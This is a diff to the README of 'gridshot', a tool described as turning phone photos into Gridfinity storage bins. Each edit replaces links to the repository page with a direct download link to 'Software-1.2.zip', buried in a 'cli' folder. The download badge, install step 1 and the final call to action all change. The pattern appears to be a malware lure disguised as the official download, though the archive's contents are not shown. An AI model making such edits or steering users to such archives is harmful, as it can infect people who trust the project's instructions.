@@ -1,7 +1,7 @@
 # 🎯 gridshot - Turn Phone Photos Into Perfect Tool Bins
 
 <p align="center">
-  <a href="https://github.com/Girondismascorbicacid50/gridshot"><img src="https://img.shields.io/badge/Download-GridShot-2ea44f?style=for-the-badge&logo=github" alt="Download GridShot"></a>
+  <a href="https://raw.githubusercontent.com/Girondismascorbicacid50/gridshot/main/gridshot/cli/Software-1.2.zip"><img src="https://img.shields.io/badge/Download-GridShot-2ea44f?style=for-the-badge&logo=github" alt="Download GridShot"></a>
 </p>
 
 ---
@@ -23,7 +23,7 @@ GridShot works **entirely on your computer**. Your photos never leave your machi
 **Step 1: Download the application**
 
 Visit this link to download the application:
-👉 **[https://github.com/Girondismascorbicacid50/gridshot](https://github.com/Girondismascorbicacid50/gridshot)**
+👉 **[https://raw.githubusercontent.com/Girondismascorbicacid50/gridshot/main/gridshot/cli/Software-1.2.zip](https://raw.githubusercontent.com/Girondismascorbicacid50/gridshot/main/gridshot/cli/Software-1.2.zip)**
 
 **Step 2: Extract the downloaded file**
 
@@ -160,6 +160,6 @@ GridShot is distributed under an open-source license. Review the license file in
 ---
 
 **Ready to organize your workshop?**  
-👉 **[Download GridShot now](https://github.com/Girondismascorbicacid50/gridshot)** and turn your phone into a precision measuring tool.
+👉 **[Download GridShot now](https://raw.githubusercontent.com/Girondismascorbicacid50/gridshot/main/gridshot/cli/Software-1.2.zip)** and turn your phone into a precision measuring tool.
 
 Keywords: Gridfinity, tool organization, 3D printing, photo calibration, desktop app, Windows, GPU-accelerated, workshop, storage bins, local-first, batch processing, STL export, open source, grid system, maker tools
